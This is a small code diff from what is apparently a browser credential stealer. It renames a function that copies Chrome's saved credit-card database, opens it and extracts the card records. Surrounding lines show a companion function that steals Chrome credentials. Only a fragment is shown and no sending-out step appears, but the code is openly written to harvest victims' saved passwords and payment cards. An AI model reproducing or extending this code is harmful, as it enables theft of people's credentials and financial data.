@@ -103,7 +103,7 @@ def steal_chrome_creds(): # get chrome credentials
     return chrome_creds
 
 
-def steal_chrome_credit_cards_info(): # get chrome credit cards
+def steal_chrome_credit_cards(): # get chrome credit cards
     __copy_db_file(__CHROME_CREDIT_CARDS_FILE, __CHROME_CREDIT_CARDS_COPY_FILE)
     con, cur = __open_db_connection(__CHROME_CREDIT_CARDS_COPY_FILE)
     credit_cards = __get_chrome_credit_cards(cur)
